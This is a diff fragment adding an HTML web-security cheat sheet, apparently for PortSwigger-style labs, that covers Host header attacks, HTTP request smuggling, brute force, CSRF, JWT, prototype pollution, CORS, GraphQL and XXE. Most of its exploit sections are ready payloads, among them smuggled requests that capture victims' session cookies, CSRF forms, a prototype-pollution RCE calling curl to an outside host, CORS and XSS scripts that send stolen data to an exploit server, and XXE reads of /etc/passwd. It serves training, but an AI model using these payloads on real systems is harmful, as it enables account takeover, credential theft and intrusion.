+          <li>Intruder over <code>192.168.0.x</code> range with <code>Host:</code> → routing-based SSRF</li>
+        </ol>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Technique</th><th>Example</th></tr>
+            <tr><td>Admin bypass</td><td><code>Host: localhost</code></td></tr>
+            <tr><td>Password reset poison</td><td><code>Host: evil.com</code> → link in email points to attacker</td></tr>
+            <tr><td>Routing-based SSRF</td><td><code>Host: 192.168.0.x</code> + Intruder</td></tr>
+            <tr><td>SSRF via absolute URL</td><td><code>GET https://vulnerable-site.com/ HTTP/1.1</code><br><code>Host: internal-server</code></td></tr>
+            <tr><td>Connection state attack</td><td>two requests in one TCP (Repeater → keep-alive); first is validated, second is not</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 5. HTTP Smuggling -->
+  <section class="section" id="smuggling">
+    <h2>5. HTTP Request Smuggling</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: sites behind a reverse proxy or load balancer. <strong>Always disable "Update Content-Length" in Burp Repeater before testing.</strong></p>
+        <p style="margin-top:8px"><strong>Step 1 — auto-detect:</strong> install <strong>HTTP Request Smuggler</strong> (BApp Store) → right-click request → Extensions → HTTP Request Smuggler → Smuggle probe. It reports the detected type.</p>
+        <p style="margin-top:8px"><strong>Step 2 — manual timing check (if auto-detect fails):</strong></p>
+        <p><em>Test CL.TE</em> — send the request below. If it hangs (~10 s timeout) → CL.TE confirmed. Frontend forwards 6 bytes (CL=6: <code>0\r\n\r\nX</code>), backend waits for more chunked data after the terminating <code>0</code> chunk.</p>
+        <pre><code>POST / HTTP/1.1
+Host: TARGET
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X</code></pre>
+        <p><em>Test TE.CL</em> — send the request below. If it hangs → TE.CL confirmed. Frontend uses TE, sends whole body; backend uses CL=3 and waits for 3 more bytes.</p>
+        <pre><code>POST / HTTP/1.1
+Host: TARGET
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+</code></pre>
+        <p><em>Test CL.0</em> — target must be HTTP/1. Backend endpoint (e.g. <code>/static/</code>, <code>/resources/</code>) must ignore Content-Length. See exploit section.</p>
+        <p><em>Test H2.CL</em> — switch Repeater to HTTP/2. Send a POST with <code>content-length: 0</code> and a body. If backend uses CL=0, it treats the body as a new request — you'll get a timeout or an unexpected response on the second send:</p>
+        <pre><code>POST / HTTP/2
+Host: TARGET
+content-length: 0
+
+SMUGGLED</code></pre>
+        <p style="font-size:12px;color:var(--muted)">Send twice quickly. First response = normal. Second response = 404 / error for "SMUGGLED" path → H2.CL confirmed.</p>
+        <p><em>Test H2.TE</em> — switch Repeater to HTTP/2. Add header via Inspector (name: <code>foo</code>, value: <code>bar\r\nTransfer-Encoding: chunked</code>). Send body with terminating chunk <code>0</code> + smuggled prefix. Send twice — second response differs → H2.TE confirmed.</p>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+
+        <p><strong>CL.TE — bypass front-end access control:</strong></p>
+        <p style="font-size:12px;color:var(--muted)">Frontend uses CL → forwards exactly N bytes. Backend uses TE → sees chunk <code>0</code> (end), then treats the remainder as a new request. Frontend blocks <code>GET /admin</code> directly but doesn't inspect the smuggled suffix.</p>
+        <ol style="margin-top:4px;padding-left:20px;font-size:13px">
+          <li>Turn off "Update Content-Length" in Burp Repeater.</li>
+          <li>Send the request below twice quickly — second response should be for <code>/admin</code>.</li>
+          <li>If admin panel uses <code>Host</code> for internal checks — add <code>Host: localhost</code> to the smuggled request.</li>
+        </ol>
+        <pre><code>POST / HTTP/1.1
+Host: TARGET
+Content-Length: 37
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-Ignore: x</code></pre>
+        <p style="font-size:12px;color:var(--muted)">CL=37 covers exactly <code>0\r\n\r\nGET /admin HTTP/1.1\r\nX-Ignore: x</code>. Count bytes carefully — wrong CL breaks the attack.</p>
+
+        <p style="margin-top:12px"><strong>TE.CL — bypass front-end access control:</strong></p>
+        <p style="font-size:12px;color:var(--muted)">Frontend uses TE (sees chunked body, forwards all). Backend uses CL=4 → reads only <code>5c\r\n</code> (4 bytes), treats the rest as a new request. Obfuscate TE so frontend accepts it but backend ignores it.</p>
+        <p style="font-size:12px;color:var(--muted)">Common TE obfuscations (try each): <code>Transfer-Encoding: xchunked</code> / <code>Transfer-Encoding :[tab]chunked</code> / two TE headers (one valid, one invalid).</p>
+        <ol style="margin-top:4px;padding-left:20px;font-size:13px">
+          <li>Turn off "Update Content-Length".</li>
+          <li>The chunk size <code>5c</code> = hex for the byte length of the smuggled request line.</li>
+          <li>Send twice — second response is for <code>/admin</code>.</li>
+        </ol>
+        <pre><code>POST / HTTP/1.1
+Host: TARGET
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+5c
+GET /admin HTTP/1.1
+Host: TARGET
+Content-Length: 15
+
+x=1
+0
+
+</code></pre>
+
+        <p style="margin-top:12px"><strong>CL.0 — poison the back-end connection:</strong></p>
+        <p style="font-size:12px;color:var(--muted)">Backend ignores Content-Length on certain endpoints (static files, 404 pages) — treats the request as having no body. Frontend sends the body normally. Result: body lands in backend's buffer as the start of the next request.</p>
+        <ol style="margin-top:4px;padding-left:20px;font-size:13px">
+          <li>Find a GET/POST endpoint where backend ignores CL — try <code>/resources/</code>, <code>/static/</code>, known 404 paths.</li>
+          <li>Use <code>Connection: keep-alive</code> — must be same TCP connection.</li>
+          <li>Send twice. Second response = response to <code>GET /admin</code>.</li>
+        </ol>
+        <pre><code>POST /resources/labheader/js/labHeader.js HTTP/1.1
+Host: TARGET
+Content-Length: 34
+Connection: keep-alive
+
+GET /admin HTTP/1.1
+X-Ignore: x</code></pre>
+
+        <p style="margin-top:12px"><strong>H2.CL — HTTP/2 downgrade:</strong></p>
+        <p style="font-size:12px;color:var(--muted)">HTTP/2 uses binary framing — no Content-Length needed. But after frontend downgrades to HTTP/1, it copies injected headers including <code>content-length</code>. Backend uses that CL value and ignores the rest of the body, treating it as a new request.</p>
+        <ol style="margin-top:4px;padding-left:20px;font-size:13px">
+          <li>In Burp Repeater — switch to HTTP/2.</li>
+          <li>Add header <code>content-length: 0</code> (lowercase — HTTP/2 requires lowercase headers).</li>
+          <li>Put the smuggled request in the body.</li>
+          <li>Send twice — second response is for the smuggled request.</li>
+        </ol>
+        <pre><code>POST / HTTP/2
+Host: TARGET
+content-length: 0
+
+GET /admin HTTP/1.1
+Host: TARGET
+X-Ignore: x</code></pre>
+        <p style="font-size:12px;color:var(--muted)">Backend sees CL=0 → treats body as a new request starting with <code>GET /admin</code>. The next legitimate request from any user completes the smuggled request headers.</p>
+
+        <p style="margin-top:12px"><strong>H2.TE — CRLF injection → bypass access control:</strong></p>
+        <p style="font-size:12px;color:var(--muted)">HTTP/2 forbids <code>\r\n</code> in header values — but some frontends don't enforce this before downgrading. Injecting <code>\r\n</code> into a header value creates a new header line after downgrade.</p>
+        <ol style="margin-top:4px;padding-left:20px;font-size:13px">
+          <li>Switch Repeater to HTTP/2.</li>
+          <li>Open <strong>Inspector</strong> → add header: name <code>foo</code>, value <code>bar</code> + literal Enter/CRLF + <code>Transfer-Encoding: chunked</code>. <strong>Do not type this in the raw editor</strong> — Burp will escape it.</li>
+          <li>Body: terminating chunk <code>0</code> + empty line + smuggled request.</li>
+          <li>Send twice.</li>
+        </ol>
+        <pre><code>POST / HTTP/2
+Host: TARGET
+foo: bar\r\nTransfer-Encoding: chunked   ← set via Inspector
+
+0
+
+GET /admin HTTP/1.1
+X-Ignore: x</code></pre>
+
+        <p style="margin-top:12px"><strong>H2.TE — capture victim cookie via search history:</strong></p>
+        <p style="font-size:12px;color:var(--muted)">Site stores search queries. Smuggled request is a partial POST to the search endpoint — <code>Content-Length: 800</code> tells backend to keep reading. Victim's next request (with their Cookie header) gets appended as the search body and saved.</p>
+        <ol style="margin-top:4px;padding-left:20px;font-size:13px">
+          <li>Switch Repeater to HTTP/2, add CRLF header via Inspector.</li>
+          <li>Send the request below, wait 5–10 seconds.</li>
+          <li>Open search history — victim's <code>Cookie:</code> header appears in the stored query.</li>
+          <li>Copy their session cookie → replace yours → reload page.</li>
+        </ol>
+        <pre><code>POST / HTTP/2
+Host: TARGET
+foo: bar\r\nTransfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Host: TARGET
+Cookie: session=YOUR-SESSION
+Content-Length: 800
+
+search=x</code></pre>
+        <p style="font-size:12px;color:var(--muted)"><code>Content-Length: 800</code> must exceed the victim request size. Too small — cookie gets cut off. Too large — backend keeps waiting and times out. Start with 800, adjust if needed.</p>
+
+        <p style="margin-top:12px"><strong>CL.TE — capture victim cookie via comment (HTTP/1):</strong></p>
+        <p style="font-size:12px;color:var(--muted)">Same idea but for HTTP/1 smuggling. Smuggle a POST to a comment endpoint — victim's request appended as comment body.</p>
+        <pre><code>POST / HTTP/1.1
+Host: TARGET
+Content-Length: 256
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Host: TARGET
+Cookie: session=YOUR_SESSION
+Content-Length: 800
+
+csrf=TOKEN&postId=5&name=x&email=x@x.com&comment=</code></pre>
+        <p style="font-size:12px;color:var(--muted)">After sending, wait a few seconds → read the comment — victim's headers including <code>Cookie:</code> appear in comment text. Adjust <code>Content-Length</code> of the outer request (256) to exactly cover the smuggled prefix — wrong value = broken attack.</p>
+
+        <p style="margin-top:12px"><strong>Response queue poisoning (H2.TE):</strong></p>
+        <p style="font-size:12px;color:var(--muted)">Split one HTTP/2 request into two complete HTTP/1 requests. Both get responses from the backend queue. Your request gets response A (normal). The second (smuggled) request steals response B — which may be another user's page with their session cookie in a redirect.</p>
+        <ol style="margin-top:4px;padding-left:20px;font-size:13px">
+          <li>Switch to HTTP/2, inject CRLF via Inspector.</li>
+          <li>Body must contain a <strong>complete</strong> second HTTP/1 request (including its own headers).</li>
+          <li>Keep sending in a loop — wait for a <code>302</code> response that belongs to another user → extract their session from <code>Set-Cookie</code>.</li>
+        </ol>
+        <pre><code>POST / HTTP/2
+Host: TARGET
+foo: bar\r\nTransfer-Encoding: chunked
+
+0
+
+GET /x HTTP/1.1
+Host: TARGET
+</code></pre>
+        <p style="font-size:12px;color:var(--muted)"><code>GET /x</code> is a deliberately invalid path — its 404 response goes to the next user's browser. That user's response (e.g. their <code>/my-account</code> page) comes back to you instead.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 6. Brute Force -->
+  <section class="section" id="bruteforce">
+    <h2>6. Brute Force</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: login form, password change, MFA code.</p>
+        <ul style="margin-top:8px">
+          <li>No rate limit → send 10+ requests in a row, no block</li>
+          <li>No lockout after N failed attempts</li>
+          <li>IP-based rate limit → bypass via <code>X-Forwarded-For</code></li>
+        </ul>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <p><strong>Intruder (Sniper / Cluster Bomb):</strong> usernames.txt + passwords.txt.</p>
+        <p><strong>IP rate limit:</strong> add <code>X-Forwarded-For: &lt;random&gt;</code> header on each request (Burp: add header in Intruder).</p>
+        <p><strong>Lockout:</strong> insert your own correct password every N attempts in the password list.</p>
+        <p><strong>MFA bruteforce:</strong> Burp macro — auto re-login after lockout → continue code brute-force.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 7. Authentication -->
+  <section class="section" id="auth">
+    <h2>7. Authentication</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p><strong>Username enumeration:</strong></p>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Signal</th><th>Method</th></tr>
+            <tr><td>Different error messages</td><td>non-existent vs wrong password</td></tr>
+            <tr><td>Different response time</td><td>long password → longer to check</td></tr>
+            <tr><td>Account lockout</td><td>the lockout itself = username exists</td></tr>
+          </table>
+        </div>
+        <p style="margin-top:8px"><strong>Stay-logged-in cookie:</strong> decode → check format <code>base64(user:md5(pass))</code>.</p>
+        <p><strong>MFA:</strong> check if you can navigate directly to the post-MFA page.</p>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <p><strong>MFA bypass:</strong></p>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Technique</th><th>Description</th></tr>
+            <tr><td>Broken logic</td><td>server sets <code>verify=carlos</code> → replace with your username → brute-force the code</td></tr>
+            <tr><td>2FA + lockout</td><td>Burp macro for auto re-login after lockout</td></tr>
+          </table>
+        </div>
+        <p style="margin-top:8px"><strong>Stay-logged-in:</strong> steal via XSS → crack MD5 offline.</p>
+        <p><strong>Password change:</strong></p>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Technique</th><th>Description</th></tr>
+            <tr><td>Differential errors</td><td>"current password incorrect" vs "new passwords don't match" → enumeration + brute-force</td></tr>
+            <tr><td>Weak reset token</td><td>predictable/short → Intruder</td></tr>
+            <tr><td>Referer leak</td><td>external resources on reset page → token leaks via <code>Referer</code></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 8. CSRF -->
+  <section class="section" id="csrf">
+    <h2>8. CSRF</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: state-changing forms.</p>
+        <ul style="margin-top:8px">
+          <li>No CSRF token in request</li>
+          <li>Token not validated (delete it → still works)</li>
+          <li>Token present → delete it, empty it, use random value — if any works, no real validation</li>
+          <li>Separate <code>csrfKey</code> cookie exists → swap <code>csrfKey</code> + <code>csrf</code> param between two accounts → if accepted, token is not tied to session</li>
+          <li>SameSite cookie not set</li>
+          <li>No <code>Origin</code> / <code>Referer</code> validation</li>
+        </ul>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <p><strong>Basic payload:</strong></p>
+        <pre><code>&lt;form action="https://site.com/email/change" method="POST"&gt;
+  &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code></pre>
+        <p><strong>Token bypass:</strong></p>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Technique</th><th>When</th></tr>
+            <tr><td>Remove token from request</td><td>server doesn't check absence</td></tr>
+            <tr><td>Replace with your own token</td><td>token not tied to session</td></tr>
+            <tr><td><code>csrf=</code> empty value</td><td>sometimes bypasses validation</td></tr>
+          </table>
+        </div>
+        <p><strong>SameSite bypass:</strong></p>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Policy</th><th>Technique</th></tr>
+            <tr><td>Lax + GET</td><td><code>?_method=POST</code> override</td></tr>
+            <tr><td>Lax + OAuth</td><td>2-min window → OAuth flow → fresh cookies → CSRF</td></tr>
+            <tr><td>Strict + redirect</td><td>JS redirect from param → <code>/redirect?path=/account/change-email</code></td></tr>
+            <tr><td>Strict + sibling XSS</td><td>XSS on <code>evil.subdomain.com</code> + WebSocket Hijacking</td></tr>
+          </table>
+        </div>
+        <p><strong>By protection type:</strong></p>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Protection</th><th>Bypass</th></tr>
+            <tr><td>Token tied to non-session cookie</td><td>cookie injection (CRLF/subdomain) + matching token</td></tr>
+            <tr><td>Double-submit cookie</td><td>set <code>csrf</code> cookie == <code>csrf</code> param to same value</td></tr>
+            <tr><td>Referer validation</td><td><code>?https://allowed-origin.com</code> in URL + <code>&lt;meta name="referrer" content="unsafe-url"&gt;</code></td></tr>
+          </table>
+        </div>
+        <p style="margin-top:10px"><strong>Token tied to non-session cookie — exploit:</strong></p>
+        <p style="font-size:12px;color:var(--muted)">csrfKey cookie is not bound to the session → inject your own csrfKey into victim's browser via CRLF in search, then submit form with matching csrf token.</p>
+        <pre><code>&lt;!-- Step 1: inject csrfKey into victim's browser via search CRLF --&gt;
+&lt;img src="https://LAB/?search=x%0d%0aSet-Cookie:%20csrfKey=YOUR-CSRFKEY%3b%20SameSite=None" onerror="document.forms[0].submit()"&gt;
+
+&lt;!-- Step 2: form with your matching csrf token --&gt;
+&lt;form action="https://LAB/my-account/change-email" method="POST"&gt;
+  &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+  &lt;input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN"&gt;
+&lt;/form&gt;</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- 9. Password Reset -->
+  <section class="section" id="pwreset">
+    <h2>9. Password Reset</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <ul>
+          <li>Token is short/predictable → request several in a row, look for a pattern</li>
+          <li>Reset page has external resources (<code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>) → token may leak via <code>Referer</code></li>
+          <li>Reset email generates a link using the domain from the <code>Host:</code> header</li>
+        </ul>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Technique</th><th>Description</th></tr>
+            <tr><td>Weak token</td><td>Intruder brute-force predictable values</td></tr>
+            <tr><td>Referer leak</td><td>external resources on reset page → <code>Referer</code> in request to them contains token</td></tr>
+            <tr><td>Host poisoning</td><td><code>Host: evil.com</code> → link in email points to attacker → capture token</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 10. JWT -->
+  <section class="section" id="jwt">
+    <h2>10. JWT</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: <code>Authorization: Bearer ...</code> or JWT in Cookie.</p>
+        <ol style="margin-top:8px">
+          <li>Decode in Burp (JWT Editor tab)</li>
+          <li>Try <code>alg: none</code> — remove signature</li>
+          <li>Check <code>kid</code> — path traversal to <code>/dev/null</code></li>
+          <li>Check <code>jku</code>/<code>jwk</code> — does it accept an external URL?</li>
+          <li>Hashcat brute-force weak secret</li>
+        </ol>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Attack</th><th>Description</th></tr>
+            <tr><td><code>alg: none</code></td><td>remove signature, keep trailing dot: <code>header.payload.</code></td></tr>
+            <tr><td>Brute force secret</td><td><code>hashcat -a 0 -m 16500 &lt;jwt&gt; jwt.secrets.list</code></td></tr>
+            <tr><td>JWK header injection</td><td>add <code>"jwk": {"kty":"RSA",...}</code> with your public key → sign with your private key</td></tr>
+            <tr><td><code>jku</code> injection</td><td><code>"jku": "https://exploit-server/jwks.json"</code> with your JWK Set</td></tr>
+            <tr><td><code>kid</code> path traversal</td><td>see steps below</td></tr>
+          </table>
+        </div>
+
+        <p style="margin-top:12px"><strong>kid path traversal — step by step:</strong></p>
+        <p style="font-size:12px;color:var(--muted)"><code>kid</code> tells the server which file to load as the signing key. If the path isn't validated, you can traverse to <code>/dev/null</code> — a file that always returns empty bytes. Sign the token with a null-byte key and the server will verify it against the same empty content.</p>
+        <ol style="margin-top:6px;padding-left:20px">
+          <li>Open <strong>JWT Editor</strong> (BApp) → <strong>Keys</strong> tab → <strong>New Symmetric Key</strong>.</li>
+          <li>In the generated key, replace the value of <code>k</code> with <code>AA==</code> (base64 of a null byte) → Save.</li>
+          <li>In Burp Repeater, open the request that uses the JWT. Switch to the <strong>JSON Web Token</strong> tab.</li>
+          <li>Edit the <strong>header</strong>: set <code>"kid": "../../../../../../../dev/null"</code></li>
+          <li>Edit the <strong>payload</strong>: set <code>"sub": "administrator"</code></li>
+          <li>Click <strong>Sign</strong> → select your <code>AA==</code> key → keep <em>Don't modify header</em> checked → OK.</li>
+          <li>Send the request to <code>/admin</code> → you should get 200.</li>
+        </ol>
+        <pre><code># Header:
+{
+  "alg": "HS256",
+  "kid": "../../../../../../../dev/null"
+}
+
+# Payload:
+{
+  "sub": "administrator",
+  "iat": 1234567890
+}</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- 11. Prototype Pollution -->
+  <section class="section" id="proto">
+    <h2>11. Prototype Pollution</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: JS apps, parameters <code>__proto__</code>, <code>constructor</code>.</p>
+        <p style="margin-top:8px"><strong>Client-side:</strong> DOM Invader (Burp) → finds gadgets automatically.</p>
+        <p><strong>Server-side detection (no reflection):</strong></p>
+        <pre><code>{"__proto__": {"status": 555}}
+→ any 404 will return status 555
+
+{"__proto__": {"json spaces": 10}}
+→ JSON responses start coming with large indentation</code></pre>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <p><strong>Client-side:</strong></p>
+        <pre><code>?__proto__[transport_url]=//evil.com/evil.js
+# transport_url → &lt;script src=...&gt; → XSS</code></pre>
+        <p><strong>Server-side:</strong></p>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Technique</th><th>Payload</th></tr>
+            <tr><td>Basic</td><td><code>{"__proto__": {"isAdmin": true}}</code></td></tr>
+            <tr><td><code>__proto__</code> filtered</td><td><code>{"constructor": {"prototype": {"isAdmin": true}}}</code></td></tr>
+            <tr><td>RCE (child processes)</td><td><code>{"__proto__": {"execArgv": ["--eval=require('child_process').exec('curl https://COLLABORATOR')"]}}</code></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 12. API Testing -->
+  <section class="section" id="api">
+    <h2>12. API Testing</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <ul>
+          <li>JS files → look for hidden endpoints (<code>/api/v1/admin</code>, <code>/api/internal</code>)</li>
+          <li>Try HTTP method switching: GET → POST → PUT → DELETE → PATCH</li>
+          <li>Add <code>/api</code>, <code>/v1</code>, <code>/v2</code> to existing paths</li>
+          <li>Content-Type: try <code>application/json</code> instead of <code>application/x-www-form-urlencoded</code></li>
+        </ul>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <ul>
+          <li>Find endpoint → try IDOR (change ID)</li>
+          <li>PUT/PATCH → try changing <code>role</code>, <code>isAdmin</code>, <code>email</code></li>
+          <li>Mass assignment → add extra fields in JSON body</li>
+          <li>Swagger / OpenAPI → <code>/api-docs</code>, <code>/swagger.json</code>, <code>/openapi.yaml</code></li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- 13. Access Control -->
+  <section class="section" id="access">
+    <h2>13. Access Control</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: object ID in request (<code>/user/123</code>, <code>/order/456</code>).</p>
+        <ul style="margin-top:8px">
+          <li>Change numeric ID → get another user's resource?</li>
+          <li>Change HTTP method → different response code?</li>
+          <li>Try <code>X-Original-URL</code> / <code>X-Rewrite-URL</code> → WAF/ACL bypass</li>
+          <li>Log in as user, copy admin requests → send without auth</li>
+        </ul>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Technique</th><th>Example</th></tr>
+            <tr><td>IDOR</td><td><code>/order/456</code> → <code>/order/457</code></td></tr>
+            <tr><td>HTTP method change</td><td>POST → GET, GET → DELETE</td></tr>
+            <tr><td><code>X-Original-URL</code></td><td><code>X-Original-URL: /admin/deleteUser</code> + request to <code>/</code></td></tr>
+            <tr><td><code>X-Rewrite-URL</code></td><td>same as above</td></tr>
+            <tr><td>Referer spoofing</td><td>forge <code>Referer: https://site.com/admin</code></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 14. GraphQL -->
+  <section class="section" id="graphql">
+    <h2>14. GraphQL</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: <code>/graphql</code>, <code>/api/graphql</code>, <code>/graphiql</code>.</p>
+        <p style="margin-top:8px"><strong>Introspection:</strong></p>
+        <pre><code>{"query": "{__schema{types{name,fields{name}}}}"}</code></pre>
+        <p>If blocked → GET or <code>\n</code> after <code>__schema</code>:</p>
+        <pre><code>/graphql?query={__schema%0A{types{name}}}</code></pre>
+        <p>No introspection → try <code>__type</code> on specific types.</p>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <p><strong>Batching to bypass rate limit:</strong></p>
+        <pre><code>[{"query":"mutation{login(user:'admin',pass:'pass1')}"},
+ {"query":"mutation{login(user:'admin',pass:'pass2')}"}]</code></pre>
+        <p><strong>CSRF via GET request:</strong></p>
+        <pre><code>/graphql?query=mutation{changeEmail(email:"attacker@evil.com")}</code></pre>
+        <p><strong>IDOR via ID in query:</strong> find fields with id via introspection → enumerate.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 15. CORS -->
+  <section class="section" id="cors">
+    <h2>15. CORS</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: API endpoints with <code>Access-Control-Allow-Origin</code>.</p>
+        <ol style="margin-top:8px">
+          <li>Add <code>Origin: https://evil.com</code> → check <code>ACAO</code> in response</li>
+          <li>Try <code>Origin: null</code></li>
+          <li>Try <code>Origin: https://subdomain.vulnerable-site.com</code></li>
+          <li>If <code>Access-Control-Allow-Credentials: true</code> → critical</li>
+        </ol>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Configuration</th><th>Exploitation</th></tr>
+            <tr><td>Reflects <code>Origin</code></td><td><code>fetch</code> with <code>credentials:'include'</code> from any domain</td></tr>
+            <tr><td><code>null</code> allowed</td><td>sandboxed <code>data:</code> iframe (see below)</td></tr>
+            <tr><td>HTTP subdomain trusted</td><td>XSS on subdomain → attack HTTPS main domain</td></tr>
+          </table>
+        </div>
+        <pre><code>&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms"
+  src="data:text/html,&lt;script&gt;
+  fetch('https://site.com/api/secret',{credentials:'include'})
+    .then(r=&gt;r.text())
+    .then(d=&gt;fetch('https://COLLABORATOR/?d='+btoa(d)))
+&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
+        <p style="margin-top:8px"><strong>XSS on trusted subdomain → steal accountDetails:</strong></p>
+        <p style="font-size:12px;color:var(--muted)">Main domain trusts a subdomain (<code>stock.*</code>) in ACAO. Subdomain has XSS via URL param. Inject script into subdomain URL — it runs in trusted origin context and can make credentialed requests to the main domain.</p>
+        <pre><code>&lt;script&gt;
+document.location="http://stock.LAB-ID.web-security-academy.net/?productId=4&lt;script&gt;var req=new XMLHttpRequest();req.onload=reqListener;req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true);req.withCredentials=true;req.send();function reqListener(){location='https://EXPLOIT-SERVER/log?key='%2bthis.responseText};&lt;/script&gt;&amp;storeId=1"
+&lt;/script&gt;</code></pre>
+        <p style="font-size:12px;color:var(--muted)"><code>%2b</code> = <code>+</code> (URL-encoded to avoid breaking the outer URL). <code>%3c/script&gt;</code> closes the injected tag. Response lands in exploit server logs — contains API key / credentials.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 16. XXE -->
+  <section class="section" id="xxe">
+    <h2>16. XXE</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: any XML input, SVG upload, file parsing.</p>
+        <ul style="margin-top:8px">
+          <li>Request with XML body → add <code>&lt;!DOCTYPE&gt;</code> + external entity</li>
+          <li>SVG upload → inject XXE inside SVG</li>
+          <li>Content-Type: try switching from JSON to XML</li>
+          <li>XInclude — when DOCTYPE can't be modified (data flows into server's XML)</li>
+        </ul>
+        <p style="margin-top:10px"><strong>Injection structure — DOCTYPE always between <code>&lt;?xml?&gt;</code> and root tag:</strong></p>
+        <pre><code>&lt;!-- Original request --&gt;
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;1&lt;/productId&gt;
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+
+&lt;!-- After XXE injection --&gt;
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [          ← open DOCTYPE (foo = any name)
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;   ← declare entity
+]&gt;                       ← close DOCTYPE
+&lt;stockCheck&gt;
+  &lt;productId&gt;&amp;xxe;&lt;/productId&gt;   ← call entity
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;</code></pre>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <p><strong>Classic (file read reflected in response):</strong></p>
+        <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;</code></pre>
+
+        <p><strong>Blind OOB (no reflection → DNS/HTTP to Collaborator):</strong></p>
+        <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR/"&gt; %xxe;]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre>
+
+        <p><strong>XInclude (cannot modify DOCTYPE — data flows into server XML):</strong></p>
+        <pre><code>&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;xi:include parse="text" href="file:///etc/passwd"/&gt;
